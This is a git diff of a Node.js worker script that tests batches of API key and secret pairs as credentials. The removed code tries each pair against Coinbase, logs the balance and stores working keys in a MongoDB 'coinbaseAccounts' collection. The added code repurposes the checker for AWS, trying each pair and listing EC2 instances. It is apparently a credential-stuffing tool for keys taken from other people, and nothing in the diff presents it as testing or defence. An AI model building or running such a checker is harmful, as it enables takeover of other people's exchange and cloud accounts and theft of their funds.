@@ -1,5 +1,5 @@
 const { expose } = require('threads/worker')
-const ccxt = require('ccxt')
+const AWS = require('aws-sdk')
 const Sentry = require('@sentry/node')
 const Promise = require('bluebird')
 const mongoose = require('mongoose')
@@ -17,23 +17,16 @@ Sentry.init({
   });
   
 expose(async combos => {
-    console.log('tryng coinbase with', combos)
+    console.log('tryng aws with', combos)
     return Promise.each(combos, async combo => {
         try {
-            let coinbase = new ccxt.coinbase(combo)
-            let balance = await coinbase.fetchBalance()
-            console.log(balance)
-            console.log('coinbase credentials worked')
-            return mongoose.model('coinbaseAccounts').create({
-                apiKey: combo.apiKey,
-                secret: combo.secret,
-                cryptos: []
-            }).then(res => res.save()).then(() => console.log('coinbase account added', combo))
+            AWS.config.update({region: 'us-east-1', credentials: {accessKeyId: combo.apiKey, secretAccessKey: combo.secret}})
+            new AWS.EC2().describeInstances().promise().then(console.log)
 
         }
         catch(err) {
           console.log(err)
-            console.log('account didnt work for coinbase', combo)
+            console.log('account didnt work for aws', combo)
 
         }
     })
